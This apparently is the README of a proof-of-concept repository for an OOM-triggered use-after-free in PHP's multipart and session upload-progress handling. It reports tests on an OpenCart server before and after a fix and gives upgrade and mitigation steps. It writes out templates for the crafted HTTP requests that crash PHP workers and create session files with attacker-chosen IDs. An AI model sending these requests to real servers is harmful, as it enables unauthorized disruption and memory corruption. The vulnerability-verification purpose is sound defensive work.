# PHP2Shell PoC: CVE-2026-109618 / CVE-2026-109619

OOM-triggered Heap Use-After-Free in PHP Session Upload Progress — Vulnerability Verification & Remediation

## Overview

PHP2Shell (CVE-2026-109618 / CVE-2026-109619, CVSS 9.2) is a pair of critical remote code execution vulnerabilities affecting **every PHP version from 5.4 to 8.5.11**. The flaws are in the PHP core engine's multipart request parsing and session upload-progress handling, allowing **unauthenticated** attackers to corrupt process memory and potentially execute arbitrary code.

This repository documents a **authorized security assessment** of a production-like OpenCart deployment to verify the vulnerability's impact and validate remediation.

## Key Findings

| Finding | Evidence |
|---------|----------|
| **OOM trigger via nested empty uploads** | 10/10 HTTP 500 — bypasses `post_max_size` |
| **Attacker-controlled session file creation** | Session files created at predictable paths with attacker-chosen IDs |
| **PHP-FPM worker termination** | FPM kills crashed workers, preventing direct stale-pointer reuse |
| **Full RCE on PHP-FPM** | **Not achieved** — FPM's worker isolation limits public PoC effectiveness |
| **Full RCE on mod_php** | Demonstrated by Wiz/Calif on WordPress, Drupal, Joomla (see references) |

### Honest Assessment

Public PoC exploits for full RCE **do not work against default PHP-FPM installations** (confirmed by Sansec Oct 22 analysis). The complete RCE chain on PHP-FPM requires:
1. Application-specific `session_start()` / `unserialize()` paths
2. Precise heap grooming tuned per target application and PHP version
3. Or an existing Local File Inclusion (LFI) vulnerability in the application

This assessment successfully demonstrated:
- ✅ The vulnerability is present and triggerable (OOM, session file creation)
- ✅ All prerequisites for exploitation are met (version, config, SAPI)
- ⚠️ Full RCE blocked by PHP-FPM worker isolation (expected behavior documented by researchers)

## Environment

| Component | Specification |
|-----------|--------------|
| Application | OpenCart 4.1.0.4 |
| Web Server | Apache 2.4.68 (mpm_event) → PHP-FPM (proxy_fcgi) |
| PHP (vulnerable) | 8.5.9 (NTS gcc x86_64) |
| PHP (fixed) | 8.5.12 (NTS gcc x86_64) |
| OS | Amazon Linux 2023 |
| Session handler | files |
| session.upload_progress.enabled | On (default) |
| memory_limit | 128M |
| post_max_size | 8M |
| pm.max_children | 200 |

## Vulnerability Mechanics

### The OOM Bypass (Calif Research)

An RFC1867 file-upload part with `filename=""`:
- Is **not counted** toward `max_file_uploads`
- PHP still creates all 6 `$_FILES` entries (name, full_path, type, tmp_name, error, size)
- With nested field names like `files[a][b][c]...`, PHP creates separate HashTable hierarchies for each entry
- **Result**: ~230KB HTTP body → >128MB PHP memory allocation → hits `memory_limit` → OOM fatal

```
post_max_size check:  Content-Length: 230428 < 8388608 (8M)  → PASS
memory_limit check:   800 × 6 × depth-40 HashTables > 134217728 (128M) → FATAL
```

### The Use-After-Free

When OOM occurs during multipart parsing:
1. `longjmp()` aborts before cleanup completes
2. PHP globals (`PS(id)`, `PS(http_session_vars)`, `BG(unserialize)`) still point to freed request heap
3. **mod_php**: Worker survives → next request uses stale pointers → RCE
4. **PHP-FPM**: Worker exits (startup failure) → stale pointers destroyed

## Attack Flow

### Phase 1: OOM Trigger

```http
POST /index.php HTTP/1.1
Host: <TARGET_HOST>
Cookie: PHPSESSID=<ATTACKER_CHOSEN_ID>
Content-Type: multipart/form-data; boundary=php2shell-<RANDOM>
Content-Length: 230428

--php2shell-<RANDOM>
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

trigger_<RANDOM>
--php2shell-<RANDOM>
Content-Disposition: form-data; name="f[ab][cd][ef]...[0]"; filename=""
Content-Type: application/octet-stream


--php2shell-<RANDOM>
Content-Disposition: form-data; name="f[gh][ij][kl]...[1]"; filename=""
Content-Type: application/octet-stream


... (800 such parts, each with unique 40-deep nested name)
--php2shell-<RANDOM>--
```

**Expected response on vulnerable PHP**: HTTP 500 (Internal Server Error)
**Expected response on fixed PHP 8.5.12**: HTTP 200

### Phase 2: Stale State Probe

```http
POST /index.php HTTP/1.1
Host: <TARGET_HOST>
Cookie: PHPSESSID=<SAME_ID_AS_PHASE_1>
Content-Type: multipart/form-data; boundary=probe-<RANDOM>

--probe-<RANDOM>
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

probe_<RANDOM>
--probe-<RANDOM>
Content-Disposition: form-data; name="dummy"

value
--probe-<RANDOM>--
```

**On mod_php (vulnerable)**: Worker crash (SIGSEGV) or memory disclosure in PHPSESSID cookie
**On PHP-FPM**: HTTP 200 (new worker, no stale state)

## Results

### Pre-Fix (PHP 8.5.9)

```
=== Attempt 1/10 (PHPSESSID=cmeomw7cl7sdwf6r1g7xzek1d1) ===
  [P1] HTTP 500 (0 bytes) — OOM/crash signal!
  [**] Session file EXISTS: /var/lib/php/session/sess_cmeomw7cl7sdwf6r1g7xzek1d1 (0 bytes)
  [P2] HTTP 200 — fresh worker, no stale state

OOM triggers: 10/10
Session files created: 10/10
Phase 2 crashes: 0/10
```

### Mitigation (session.upload_progress.enabled=Off)

```
OOM triggers: 5/5 (still triggerable via multipart parser)
Session files created: 0/5 ✓ (session poisoning vector blocked)
```

### Post-Fix (PHP 8.5.12)

```
OOM triggers: 0/5 ✓ (OOM converted to soft error, cleanup always runs)
HTTP 200: 5/5 ✓
No worker crashes ✓
```

## Remediation

### Permanent Fix: Upgrade PHP

```bash
# Amazon Linux 2023
dnf upgrade --releasever=latest -y php8.5*
systemctl restart php-fpm
php -v  # Verify: PHP 8.5.12

# Debian/Ubuntu (Ondřej Surý PPA)
apt update && apt upgrade php8.5-*
systemctl restart php8.5-fpm

# RHEL/Rocky/Alma (Remi repo)
dnf update php-*
systemctl restart php-fpm
```

**Fixed versions**: PHP 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35

### Temporary Mitigation (if upgrade not immediately possible)

```bash
# 1. Disable session upload progress (blocks CVE-2026-109618 session poisoning)
echo "session.upload_progress.enabled = Off" > /etc/php.d/99-php2shell-mitigation.ini
systemctl restart php-fpm

# 2. Additional hardening (partial, does NOT replace upgrade):
# - Set memory_limit = -1 (removes OOM trigger but allows unbounded memory use)
# - Set pm.max_requests = 1 (breaks same-worker requirement for FPM)

# Verify:
php -i | grep session.upload_progress.enabled
# Expected: session.upload_progress.enabled => Off => Off
```

⚠️ **The mitigation does NOT fix CVE-2026-109619** (multipart parser UAF fires without upload_progress). Only a PHP upgrade is a complete fix.

## Fix Verification

| Metric | Before (8.5.9) | Mitigated | Fixed (8.5.12) |
|--------|----------------|-----------|----------------|
| OOM HTTP 500 | 10/10 ✗ | 5/5 ✗ | **0/5 ✓** |
| Session file creation | 10/10 ✗ | **0/5 ✓** | 5/5 (normal) |
| Worker crash | Yes | Yes | **No** |
| Application functional | Yes | Yes | **Yes** |

## Scripts

| File | Purpose |
|------|---------|
| `scripts/php2shell_oom_poc.py` | OOM trigger + Phase 2 stale state probe |
| `scripts/splat_poc.py` | Lightweight crash PoC (raw socket) |

## References

- [PHP Security Advisory](https://www.php.net/archive/2026.php#2026-10-21-5)
- [Calif: PHP2Shell Research](https://calif.io/php2shell/) — Original discovery, detailed C-level analysis
- [Wiz: PHP2Shell](https://www.wiz.io/blog/php2shell-php-rce) — AI-assisted discovery, RCE demos
- [JFrog: Technical Analysis](https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/)
- [NCSC-NL: Operational Info](https://github.com/NCSC-NL/php2shell)
- [Sansec: E-commerce Impact](https://sansec.io/research/php2shell)
- [AWS Security Bulletin 2026-143](https://aws.amazon.com/security/security-bulletins/2026-143-aws/)
- [9bie: ASLR Bypass Exploit (mod_php)](https://github.com/9bie/php2shell-bypass-aslr-exp)

## License

This material is for **authorized security testing and education only**. Unauthorized testing against systems you do not own or have explicit permission to test is illegal.
